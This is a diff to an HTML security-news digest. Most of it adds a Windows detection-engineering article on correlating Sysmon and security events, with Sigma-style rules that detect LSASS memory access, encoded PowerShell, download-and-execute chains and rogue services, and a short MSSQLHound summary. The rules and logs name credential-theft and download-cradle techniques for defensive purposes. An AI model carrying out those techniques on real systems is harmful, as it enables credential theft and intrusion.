+This is a download cradle with certificate validation bypass. Clearly malicious. Now what?
+Step 1: Identify the session
+Look at the same event's metadata to get the user context and Security ID.
+Step 2: Find the process context (Sysmon Event 1)
+Query for powershell.exe process creation around the same time:
+Now you know:
+- PowerShell was spawned by cmd. exe
+- Execution policy was bypassed
+- Window was hidden
+- User was CORP\jsmith
+- LogonID is 0x7A8B4
+Step 3: Trace the parent chain
+What spawned cmd. exe? Query Sysmon Event 1 for that process ID:
+Outlook spawned the command prompt. This is likely a phishing email with a malicious attachment or link.
+Step 4: Check network connections (Sysmon Event 3)
+Did PowerShell actually connect to that IP address?
+Event ID: 3 (Sysmon)
+TimeCreated: 2024-03-15 14:23:46
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+DestinationIp: 192.168.100.50
+DestinationPort: 443
+Protocol: tcp
+User: CORP\jsmith
+Confirmed. PowerShell connected to the C2 server.
+Step 5: Look for follow-up activity
+Using the LogonID, search for all subsequent events in that session:
+- Additional process creation (Event 4688, Sysmon 1)
+- File creation (Sysmon Event 11)
+- Registry modifications (Sysmon Events 12, 13)
+- More network connections (Sysmon Event 3)
+- LSASS access (Sysmon Event 10)
+Step 6: Identify the initial AP (Event 4624)
+Event ID: 4624
+TimeCreated: 2024-03-15 08:15:22
+TargetUserName: jsmith
+LogonType: 2
+WorkstationName: WORKSTATION01
+LogonId: 0x7A8B4
+The user logged on interactively at 8:15AM. The malicious activity started at 2:23PM. The attacker likely had to wait for the user to interact with the phishing email.
+Step 7: Scope the damage
+With the session bounded by logon (4624) and logoff (4634), you can identify everything that happened:
+- Files created or modified
+- Registry changes
+- Lateral movement attempts
+- Data staged for exfiltration
+Building Detections That Use Correlation
+Detection engineering benefits from correlation too. Instead of alerting on individual events, you can build detections that require multiple corroborating signals.
+Example 1: LSASS Access From Suspicious Parent
+Logic: Alert when a process accesses LSASS (Sysmon Event 10) AND the parent process is unusual
+# Pseudocode detection logic
+correlation:
+- sysmon_event_10:
+TargetImage: "lsass.exe"
+GrantedAccess:
+- "0x1010"
+- "0x1FFFFF"
+- sysmon_event_1:
+ProcessId: $source_process_id
+ParentImage: not in [
+"MsMpEng.exe",
+"csrss.exe",
+"services.exe"
+]
+Example 2: Download and Execute Pattern
+Logic: Alert when you see a network connection (Sysmon Event 3) followed by a new process creation (Sysmon Event 1) from a script interpreter within a short time window
+# Pseudocode
+correlation:
+- sysmon_event_3:
+Image: contains ["powershell", "wscript", "cscript", "mshta"]
+DestinationIsIpv6: false
+- within 30 seconds:
+- sysmon_event_1:
+ParentImage: same as above
+Image: not in [legitimate_children]
+Example 3: Persistence Followed by Execution
+Logic: Alert when a registry run key is created (Sysmon Event 13) and then a process starts from that path
+# Pseudocode
+correlation:
+- sysmon_event_13:
+TargetObject: contains "CurrentVersion\Run"
+Details: capture as $executable_path
+- within 1 hour:
+- sysmon_event_1:
+Image: equals $executable_path
+Practical Detection Examples
+Let me provide some concrete Sigma-style detection rules that leverage our logging foundation. I like [Sigma](https://github.com/SigmaHQ/sigma) rules because they can be used with most SIEMs.
+Encoded PowerShell Execution
+title: Encoded PowerShell Command Execution
+status: stable
+logsource:
+product: windows
+category: process_creation
+detection:
+selection_process:
+Image|endswith: '\powershell.exe'
+selection_encoded:
+CommandLine|contains:
+- ' -enc '
+- ' -encodedcommand '
+- ' -ec '
+condition: selection_process and selection_encoded
+level: medium
+LSASS Memory Access
+title: LSASS Memory Access by Suspicious Process
+status: stable
+logsource:
+product: windows
+category: sysmon
+service: sysmon
+detection:
+selection:
+EventID: 10
+TargetImage|endswith: '\lsass.exe'
+GrantedAccess:
+- '0x1010'
+- '0x1410'
+- '0x1FFFFF'
+filter_legitimate:
+SourceImage|contains:
+- '\MsMpEng.exe'
+- '\vmtoolsd.exe'
+- '\csrss.exe'
+condition: selection and not filter_legitimate
+level: high
+Remote PowerShell Execution (WinRM)
+New Service Installation
+title: Suspicious Service Installation
+status: stable
+logsource:
+product: windows
+service: security
+detection:
+selection:
+EventID: 4697
+filter_legitimate:
+ServiceFileName|contains:
+- '\Windows\'
+- '\Program Files\'
+condition: selection and not filter_legitimate
+level: high
+Building a Correlation Playbook
+When responding to incidents, having a systematic approach helps. Here's a playbook structure:
+For Any Suspicious Process:
+1. Get process details (Sysmon Event 1)
+- Image, CommandLine, Hashes
+- Parent process chain
+2. Check network activity (Sysmon Event 3)
+- Did this process make external connections?
+3. Check file operations (Sysmon Event 11)
+- Did this process create files?
+4. Check registry operations (Sysmon Events 12, 13, 14)
+- Did this process establish persistence?
+5. Identify the session (LogonID → Event 4624)
+- Who was logged on?
+- From where?
+6. Scope all session activity
+- What else happened in this session?
+For Lateral Movement Investigation:
+1. Identify network logons (Event 4624, LogonTypes 3, 10)
+- From which source IP addresses?
+- Which accounts?
+2. Trace the source
+- Look for the same account on the source system
+- What initiated the connection?
+3. Check for credential material
+- LSASS access on source (Sysmon Event 10)
+- Kerberos ticket requests (Events 4768, 4769)
+The Value of Redundancy
+Throughout this series, I've emphasized layered telemetry, sometimes a bit too much? Let me give you one final example of why this all matters.
+Scenario: An attacker uses a signed, living-off-the-land (LOTL) binary to execute malicious code.
+What EDR might show: Possibly nothing—the binary is signed and commonly used.
+What you'll see with our foundation:
+Event Source | What It Captures |
+|---|---|
+Event 4624 | Initial logon session |
+Event 4688 | mshta.exe execution with URL parameter |
+Sysmon Event 1 | Same, plus hash, parent process |
+Sysmon Event 3 | Network connection to malicious URL |
+PowerShell 4104 | If PowerShell was spawned, full script content |
+Sysmon Event 11 | Any payloads written to disk |
+Sysmon Event 13 | Persistence mechanisms created |
+Even if your EDR is blind, you have the full story.
+Final Thoughts
+Building a detection foundation isn't a one-time project. It's a capability that requires ongoing attention:
+- Tune your configurations as you learn what's noisy and what's valuable.
+- Test your visibility by running adversary simulations.
+- Practice correlation before you need it in a real incident.
+- Document your environment so you know what's logging and what isn't.
+The ultimate goal we've worked toward in this series is resilience. When (not if) your primary security tool misses something, you want to have the data to detect and investigate independently.
+The techniques we've covered—native Windows auditing, PowerShell logging, and Sysmon—are proven, operationally tested, and free. They require effort to implement well, but that effort pays dividends every time you use them to answer the question: "What exactly happened here?"
+If you need help with this effort, [get in touch with us](https://trustedsec.com/contact)! We have a great Purple Team that can assist in planning and building your detection foundation.
+I may tackle the same approach for Linux ... 🤔</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-7" class="article-body">
             <h2 class="article-title">The Proliferation of DarkSword: iOS Exploit Chain Adopted by Multiple Threat Actors</h2>
             <p class="source-link">Source: Threat Intelligence | <a href="https://cloud.google.com/blog/topics/threat-intelligence/darksword-ios-exploit-chain/" target="_blank">Original Link</a></p>
             <div class="content-text">The Proliferation of DarkSword: iOS Exploit Chain Adopted by Multiple Threat Actors
@@ -914,7 +1048,7 @@ any of them
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-9" class="article-body">
+        <div id="art-8" class="article-body">
             <h2 class="article-title">Microsoft Patch Tuesday, March 2026 Edition</h2>
             <p class="source-link">Source: Krebs on Security | <a href="https://krebsonsecurity.com/2026/03/microsoft-patch-tuesday-march-2026-edition/" target="_blank">Original Link</a></p>
             <div class="content-text">Microsoft Corp. today pushed security updates to fix at least 77 vulnerabilities in its Windows operating systems and other software. There are no pressing “zero-day” flaws this month (compared to February’s five zero-day treat), but as usual some patches may deserve more rapid attention from organizations using Windows. Here are a few highlights from this month’s Patch Tuesday.
@@ -948,6 +1082,17 @@ I mean, any bug, prior to being disclosed, is at some point a ‘zero-day’ bug
 Have they heard about two-factor authentication? They were obviously phished. Maybe put TFA in place now.
 Lol at the roughy in your article! You criminal mastermind, Keir!
 Keep a close eye on that .NET vulnerability (CVE-2026-26127). If a machine crashes hard mid-update, it frequently corrupts the Master File Table. We always see a spike in ‘RAW’ or unbootable drives right after Patch Tuesday rollups go sideways. If you end up with an inaccessible drive this week, don’t immediately wipe it. Run a block-level scan with a tool like Stellar Data Recovery first, it bypasses the scrambled partition table to pull the raw files, which are almost always still intact.</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-9" class="article-body">
+            <h2 class="article-title">Updates to the MSSQLHound OpenGraph Collector for BloodHound</h2>
+            <p class="source-link">Source: Research & Tradecraft Archives - SpecterOps | <a href="https://specterops.io/blog/2026/01/20/updates-to-the-mssqlhound-opengraph-collector-for-bloodhound/" target="_blank">Original Link</a></p>
+            <div class="content-text"><p>tl;dr: MSSQLHound, a PowerShell script that collects security information from remote MSSQL Server instances, now scans them to determine whether or not NTLM relay attacks are possible, accounts for a recent privilege escalation vulnerability, and includes queries you can import into the BloodHound attack path graph to visualize, navigate, and remediate misconfigurations in MSSQL. Updates [&#8230;]</p>
+<p>The post <a href="https://specterops.io/blog/2026/01/20/updates-to-the-mssqlhound-opengraph-collector-for-bloodhound/">Updates to the MSSQLHound OpenGraph Collector for BloodHound</a> appeared first on <a href="https://specterops.io">SpecterOps</a>.</p>
+
+[Full content could not be extracted. Visit source for details.]</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
